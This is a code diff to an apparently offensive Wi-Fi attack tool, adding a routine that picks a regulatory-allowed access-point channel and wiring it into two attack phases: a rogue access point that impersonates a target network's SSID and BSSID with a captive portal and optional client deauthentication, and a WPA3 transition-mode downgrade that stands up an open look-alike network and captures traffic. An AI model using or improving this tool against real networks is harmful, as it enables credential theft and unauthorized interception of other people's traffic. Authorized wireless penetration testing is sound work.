@@ -53,7 +53,7 @@ import struct
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.7.2"
+VERSION = "1.7.3"
 
 
 def _clients_base() -> Path:
@@ -2574,6 +2574,58 @@ def _assign_ip_to_iface(iface: str, ip_cidr: str) -> bool:
         return False
 
 
+def _select_ap_channel(ap_iface: str, preferred: int) -> int:
+    """Return a channel allowed for AP mode on ap_iface, nearest to preferred.
+
+    Queries iw for the regulatory-allowed channel list on the interface's phy
+    and filters out channels flagged NO-IR or disabled.  Falls back to preferred
+    (letting hostapd surface the real error) if iw is unavailable or parsing
+    fails.
+    """
+    if not shutil.which("iw"):
+        return preferred
+
+    info_out, _ = _run(["iw", "dev", ap_iface, "info"], timeout=5)
+    m = re.search(r'wiphy\s+(\d+)', info_out)
+    if not m:
+        return preferred
+    phy = f"phy{m.group(1)}"
+
+    list_out, _ = _run(["iw", "list"], timeout=10)
+    allowed: set[int] = set()
+    in_phy   = False
+    in_freqs = False
+
+    for line in list_out.splitlines():
+        if re.match(r'^Wiphy\s+', line):
+            in_phy   = line.strip().endswith(phy)
+            in_freqs = False
+            continue
+        if not in_phy:
+            continue
+        if 'Frequencies:' in line:
+            in_freqs = True
+            continue
+        if in_freqs:
+            if line and not line[0].isspace():
+                in_freqs = False
+                continue
+            fm = re.search(r'\* (\d+) MHz \[(\d+)\](.*)', line)
+            if fm:
+                flags = fm.group(3).lower()
+                if 'no ir' not in flags and 'disabled' not in flags:
+                    allowed.add(int(fm.group(2)))
+
+    if not allowed or preferred in allowed:
+        return preferred
+
+    is_5g   = preferred >= 36
+    in_band = [c for c in allowed if (c >= 36) == is_5g]
+    if in_band:
+        return min(in_band, key=lambda c: abs(c - preferred))
+    return min(allowed, key=lambda c: abs(c - preferred))
+
+
 def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
                          encryption: str, psk: str, ap_iface: str,
                          work_dir: Path) -> Path:
@@ -2760,6 +2812,11 @@ def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
     deauth_cl   = rogue_cfg.get("deauth_clients", False)
     duration    = int(rogue_cfg.get("portal_duration", 180))
 
+    ap_channel = _select_ap_channel(ap_iface, channel)
+    if ap_channel != channel:
+        log(f"Phase 6: Channel {channel} not available for AP mode on {ap_iface} "
+            f"(NO-IR/disabled) — using channel {ap_channel}")
+
     rogue_dir = output_dir / "rogue_ap"
     rogue_dir.mkdir(exist_ok=True)
     log(f"Phase 6: Interface={ap_iface}  Target={ssid!r} [{bssid}]  "
@@ -2772,7 +2829,7 @@ def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
 
     # Write configs
     ha_conf = _write_hostapd_conf(
-        ssid, bssid, channel,
+        ssid, bssid, ap_channel,
         "WPA2" if use_psk_ap else "OPEN", psk if use_psk_ap else "",
         ap_iface, rogue_dir,
     )
@@ -3256,14 +3313,18 @@ def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
     dg_dir.mkdir(exist_ok=True)
 
     for ap in wpa3_transition:
-        ssid    = ap.get("ssid", "")
-        bssid   = ap.get("bssid", "")
-        channel = int(ap.get("channel") or 6)
+        ssid       = ap.get("ssid", "")
+        bssid      = ap.get("bssid", "")
+        channel    = int(ap.get("channel") or 6)
+        ap_channel = _select_ap_channel(ap_iface, channel)
+        if ap_channel != channel:
+            log(f"Phase 9: Channel {channel} not available for AP mode on {ap_iface} "
+                f"(NO-IR/disabled) — using channel {ap_channel}")
         log(f"Phase 9: WPA2-only rogue AP targeting {ssid!r} [{bssid}] (transition mode)")
 
         if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
             continue
-        ha_conf = _write_hostapd_conf(ssid, "", channel, "OPEN", "", ap_iface, dg_dir)
+        ha_conf = _write_hostapd_conf(ssid, "", ap_channel, "OPEN", "", ap_iface, dg_dir)
         dm_conf = _write_dnsmasq_conf(ap_iface, dg_dir)
 
         cap_file = dg_dir / f"sae_dg_{bssid.replace(':','')}.cap"
